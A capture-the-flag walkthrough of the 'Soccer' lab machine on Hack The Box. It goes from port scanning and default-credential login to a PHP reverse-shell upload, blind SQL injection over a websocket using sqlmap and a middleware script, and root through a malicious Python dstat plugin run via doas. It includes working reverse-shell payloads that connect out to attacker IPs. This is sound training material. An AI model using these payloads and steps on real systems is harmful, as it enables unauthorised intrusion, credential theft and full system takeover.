Machine name: Soccer
--------------------

*   **Status:** Retired
*   **OS:** Linux
*   **Difficulty:** Easy
*   **Date Owned:** 4/3/2023 
*   **IP Assigned:** 10.10.11.194

<br>

Enumeration
-----------

I will begin by enumerating TCP ports on the machine with NMAP using the following switches:

\-sS: syn scan, this is quick and stealthy as it does not complete the TCP connection. It can also differentiation between open, closed, and filtered states of a port. I will need to be run with sudo privileges as it requires raw packet manipulation.

Note: if not otherwise specified nmap will scan the top 1000 TCP ports.

```text-plain
sudo nmap -sS 10.10.11.194 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 18:02 EDT
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

Since port 80 is open we'll start by adding the domain to hosts and look at what's being hosted by the web service.

```text-plain
echo ‘10.10.11.194 soccer.htb' | sudo tee -a /etc/hosts
```

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/c65bebc8-16ca-4bfd-826f-6a823e11b318)


There dont seem to be any loose threads to pull at on this page so lets look for sub-pages that might have more functionality. For this well use a tool called gobuster which is used for directory and subdomain brute-forcing written in golang.

```text-plain
gobuster dir -u http://soccer.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/07 18:18:09 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
Progress: 19852 / 19967 (99.42%)===============================================================
2023/05/07 18:18:58 Finished
===============================================================
```

Gobuster found the subdomain /tiny so lets navigate there in the web browser. 

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/45800b3e-851b-44f3-8dcb-787c6d2806b2)


File Upload
-----------

At http://soccer.htb/tiny/  we find a login page. After a bit a googling we find out that Tiny is a simple PHP web based file manager and the default credentials are admin:admin@123 and user:12345. Lets try these and see if they have been changed yet. 

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/a4f67061-3ff7-478f-b506-123f4654af3e)


And there we have it, we're logged in as admin! After some poking around it seems we can create and upload files in the tiny/uploads directory. Since we know Tiny is PHP based so lets grab a PHP reverse shell from payloadallthethings github. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

```text-plain
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f"); ?>
```

You'll need to replace the IP with your IP address and specify the port you're going to listen on. Then start a netcat listener to catch the reverse shell.

```text-plain
nc -nlvp 4444        
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

Then either create a file on your machine with the payload in it, or just use the new item button in the top right of the webpage file manager, make sure you're in the tiny/uploads folder and save your file with the .php extension.

Webshell Access
---------------

Once the payload is saved in the uploads folder click the preview icon to execute your shell code. Check your netcat listener which should have caught the connection. We now have shell access to the target with the _www-data_ user.

```text-plain
Ncat: Connection from 10.10.11.194.
Ncat: Connection from 10.10.11.194:50836.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

After a bit of looking around we find a new subdomain in a file /etc/nginx/sites-enabled/soc-player.htb

```text-plain
cat soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

We'll add this domain to our hosts file and navigate to the webpage.

```text-plain
echo ‘10.10.11.194 soc-player.soccer.htb’ | sudo tee -a /etc/hosts
```

At the webpage we see a banner offering a free ticket when you sign up or login. Maybe we can take advantage of this functionality. 

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/82198f29-2254-4108-871a-8bd9b7a2f3ae)


After signing up with fake credentials and logging in we are presented with a form for our free ticket. Use CTRL-U to view the source code and take a look at the script behind this functionality. 

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/2fedf805-9573-485e-a54d-eb60e4094260)


SQL Injection
-------------

In order to perform a SQL injection attack we will need a tool that will pass sqlmap traffic to the websocket found in the script. There is a blog post about a tool that will automate this task here [https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

The ws-server and data fields need to be changed to the values in the free ticket script we found.

```text-plain
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection
ws_server = "ws://soc-player.soccer.htb:9091"
def send_ws(payload):
    ws = create_connection(ws_server)
    # If the server returns a response on connect, use below line    
    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
    
    # For our case, format the payload in JSON
    message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
    data = '{"id":"%s"}' % message
    ws.send(data)
    resp = ws.recv()
    ws.close()
    if resp:
        return resp
    else:
        return ''
def middleware_server(host_port,content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False
                
            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'
            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return
    class _TCPServer(TCPServer):
        allow_reuse_address = True
    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()

print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")
try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass
```

Save this as a file on your local machine with the .py extension. We will need to execute this middleware server to forward the traffic from SQLmap to our target websocket.

```text-plain
python3 ws-translator.py 
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```

Now open a new terminal and run sqlmap with the target being the middleware server.

```text-plain
sqlmap -u http://localhost:8081/?id=1 --dump-all --exclude-sysdbs
...
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 2818 FROM (SELECT(SLEEP(5)))tmhV)
...
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

Eventually we find some creds in the accounts table.

Foothold
--------

Now that we have credentials try to SSH into the target.

```text-plain
ssh player@soccer.htb
player@soccer.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage
 System information as of Mon May  8 00:14:52 UTC 2023
 System load:           0.08
 Usage of /:            70.7% of 3.84GB
 Memory usage:          26%
 Swap usage:            0%
 Processes:             243
 Users logged in:       0
 IPv4 address for eth0: 10.10.11.194
 IPv6 address for eth0: dead:beef::250:56ff:feb9:786d

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon May  8 00:14:42 2023 from 10.10.14.10
player@soccer:~$ 
```

That worked! We now have a reliable and silent way to access the target. The user flag can be found at /home/player/user.txt

```text-plain
cat /home/player/user.txt
HTB{********************************}
```

Privilege Escalation
--------------------

There are many ways to go about enumerating privesc paths. I'll start by looking for low hanging fruit with this script, which finds a number of results but the first being an interesting named file in the local binaries directory. Lets take a look at that first.

```text-plain
find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/doas
```

In the /usr/local/etc directory we find a configuration file for the doas binary called doas.conf

```text-plain
cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

Creating a Dstat Plugin
-----------------------

The \[Dstat man page\](https://linux.die.net/man/1/dstat) has a section about plugins.

> Plugins
> 
> While anyone can create their own dstat plugins (and contribute them) dstat ships with a number of plugins already that extend its capabilities greatly. Here is an overview of the plugins dstat ships with:

Since we saw in the conf file that we may be able to execute commands as root from the dstat directory, lets try to create a custom dstat plugin that will execute a payload as root.

First we'll need to know the proper naming convention for dstat plugin files which is dstat\_filename.py where filename is the name of your plugin. I created a plugin file using this naming convention containing the payload below.

```text-plain
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);
```

Now I will start a python http server from the location of the file I created.

```text-plain
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

From the SSH terminal wget the plugin file from your local machine.

```text-plain
wget 10.10.14.10:8080/dstat_notshell.py
--2023-05-08 01:32:31--  http://10.10.14.10:8080/dstat_notshell.py
Connecting to 10.10.14.10:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 216 [text/x-python]
Saving to: ‘dstat_notshell.py’
dstat_notshell.py            100%[===========================================>]     216  --.-KB/s    in 0s      
2023-05-08 01:32:31 (17.2 MB/s) - ‘dstat_notshell.py’ saved [216/216]
```

Check that the file is in the /usr/local/share/dstat directory before moving on to the next step.

```text-plain
ls -al
total 12
drwxrwx--- 2 root   player 4096 May  8 01:35 .
drwxr-xr-x 6 root   root   4096 Nov 17 09:16 ..
-rw-rw-r-- 1 player player  216 May  8 01:24 dstat_notshell.py
```

Root Shell Access
-----------------

Now in a separate terminal start a netcat listener on the port specified in your payload.

```text-plain
c -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

And finally execute your plugin in the SSH terminal.

```text-plain
doas /usr/bin/dstat --notshell
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
```

The command should hang, which is always a good sign. Check your netcat listener for a session. The root flag is located at /root/root.txt

```text-plain
Ncat: Connection from 10.10.11.194.
Ncat: Connection from 10.10.11.194:52816.
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
HTB{********************************}
```

Congratulations on completing this machine! Happy Hunting.
